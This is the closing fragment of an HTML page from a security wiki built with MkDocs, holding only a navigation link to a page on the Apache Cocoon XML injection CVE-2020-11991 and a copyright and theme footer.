        Previous</a><a href="../Apache%20Cocoon%20XML%E6%B3%A8%E5%85%A5%20CVE-2020-11991/" class="btn btn-xs btn-link">
        Apache Cocoon XML注入 CVE-2020-11991
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>